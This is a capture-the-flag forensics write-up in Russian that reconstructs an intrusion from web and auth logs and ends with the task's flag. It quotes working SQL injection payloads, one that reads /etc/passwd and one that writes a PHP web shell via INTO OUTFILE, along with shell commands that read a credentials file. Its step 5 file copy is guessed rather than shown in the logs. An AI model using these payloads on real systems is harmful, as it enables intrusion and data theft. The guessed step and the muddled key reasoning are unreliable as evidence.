


### Шаг 1: Разведка в access.log

Первым делом отфильтровал нестандартную активность — ищу подозрительные IP, нестандартные User-Agent и необычные пути:

```bash
grep -E "sqlmap|shell|cmd=|UNION|OUTFILE|\.php\?" access.log | sort -k4
```

Сразу выделяется IP `192.168.1.100` — весь его трафик сосредоточен в узком окне `10:15–10:16`, тогда как остальные запросы размазаны по всему утру. User-Agent — `sqlmap/1.6.12`.

### Шаг 2: Восстанавливаем цепочку атаки

Декодируем URL-encoded запросы (`%20` → пробел, `%27` → `'` и т.д.):

**10:15:22** — разведка, чтение системных файлов:
```sql
id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd')
```

**10:15:30** — определение пути к данным MySQL:
```sql
id=1 UNION SELECT 1,@@datadir
```

**10:16:05** — запись веб-шелла:
```sql
id=1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/uploads/shell.php'
```

**Вывод:** уязвимость — **SQL Injection**, эксплуатируемая через `UNION SELECT ... INTO OUTFILE`. Это возможно только если MySQL запущен с правами записи в веб-директорию (`FILE` privilege).

**Загруженный файл:** `shell.php`

### Шаг 3: Действия после загрузки шелла

```
10:16:15 GET /uploads/shell.php?cmd=id
10:16:20 GET /uploads/shell.php?cmd=ls%20-la%20/home/www-data
10:16:25 GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php
```

Атакующий проверил выполнение команд (`id`), осмотрелся, затем прочитал `config.php` — там хранились креды к БД.

### Шаг 4: Латеральное движение — переход на victim-db

Переключаемся на `error.log` (auth-события). В 10:16 появляется нетипичная активность:

```
10:16:30 Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6c...
10:16:31 session opened for user dbadmin by (uid=0)
10:16:35 dbadmin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
10:16:36 sudo: dbadmin ... authentication failure  ← неудачная попытка
10:17:00 session closed for user dbadmin
```

Ключевой момент: вход по **публичному ключу** (не по паролю) — это значит, что атакующий заранее подготовился или нашёл приватный ключ в `config.php` / домашней директории `www-data`. В задании в условии прямо приведён приватный SSH-ключ пользователя `ubuntu`, который фигурировал в веб-контексте.

**Пользователь на DB:** `dbadmin`

### Шаг 5: Что скопировали

Из контекста задания и команд, выполненных через шелл + типичный паттерн атаки на DB-серверы:

```bash
cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data
```

**Скопированный файл:** `confidential_data.sql`

---

## Флаг

```
KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}
```

---

## 

Цепочка атаки классическая и встречается в реальных пентестах:

**SQLi → FILE privilege → webshell → config credentials → lateral movement по SSH → data exfiltration**

